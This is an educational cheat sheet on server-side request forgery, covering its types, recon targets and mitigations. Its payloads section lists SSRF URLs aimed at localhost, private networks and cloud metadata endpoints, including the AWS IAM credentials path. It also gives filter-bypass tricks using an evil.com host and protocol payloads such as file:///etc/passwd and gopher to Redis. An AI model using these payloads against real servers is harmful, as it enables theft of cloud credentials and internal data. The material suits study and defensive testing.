## What is SSRF ?
**SSRF: The server fetches URLs on behalf of users. SSRF tricks the server into fetching internal/private resources (like localhost/admin) that only the server can access — not you directly.**

## Why is Dangerous ?
- Attacker Bypass Firewall
- Leak Sensitive Information
- Unauthorization Request
- Do Your Evil Site Request
- Reveal Internal IP's
- Access Cloud Metadata (AWS, GCP, Azure)
- Can Chain Into RCE

## Types Of SSRF ?
- **Basic SSRF** — Response is directly visible to attacker
- **Blind SSRF** — No response visible, detected via out-of-band (Burp Collaborator/interactsh)
- **Semi-Blind SSRF** — Partial info leaked via error messages or timing

## Attack Flow ?
```
Attacker → Sends Request To Vulnerable Server
         → Server Fetches Attacker-Controlled URL
         → Server Returns Internal Resource To Attacker

Example:
Normal : User → Server → api.example.com       ✅
SSRF   : User → Server → localhost/admin        ❌
SSRF   : User → Server → 169.254.169.254        ❌ (AWS Metadata)
```

## Where To look ? (Recon)
- URL Parameters: `?url=` `?src=` `?path=` `?fetch=` `?load=` `?file=` `?redirect=`
- File Import / Export Features
- PDF / Document Generators
- Image Fetchers / URL Preview Features
- Webhooks
- API Integrations That Fetch External URLs
- HTTP Headers: `Referer`, `X-Forwarded-For`, `Host`

## Payloads ?

**Basic:**
```
http://localhost/admin
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
```

**Internal Network Scan:**
```
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
```

**Cloud Metadata:**
```
http://169.254.169.254/latest/meta-data/                          (AWS)
http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS IAM Keys)
http://metadata.google.internal/computeMetadata/v1/               (GCP)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   (Azure)
```

**Filter Bypass:**
```
http://127.1/                    ← Short IP
http://2130706433/               ← Decimal IP (127.0.0.1)
http://0177.0.0.1/               ← Octal IP
http://127.0.0.1.nip.io/        ← DNS Trick
http://localhost@evil.com/       ← @ Bypass
http://evil.com#localhost/       ← Fragment Bypass
```

**Protocol Bypass:**
```
file:///etc/passwd               ← Local File Read
dict://localhost:6379/           ← Redis
gopher://localhost:6379/         ← Advanced Redis/Memcached
```

**Blind SSRF Detection:**
```
https://YOUR-ID.burpcollaborator.net
https://YOUR-ID.oast.fun          ← interactsh (free)
```

## Mitigations ?
- Whitelist Only Allowed Domains — Deny Everything Else
- Block Private IP Ranges (127.x, 10.x, 192.168.x, 169.254.x)
- Disable Unnecessary URL Schemes (file://, gopher://, dict://)
- Do Not Forward Raw Server Responses To User
- Use Firewall To Block Outbound Requests From Server
- Validate And Sanitize All User-Supplied URLs Server-Side
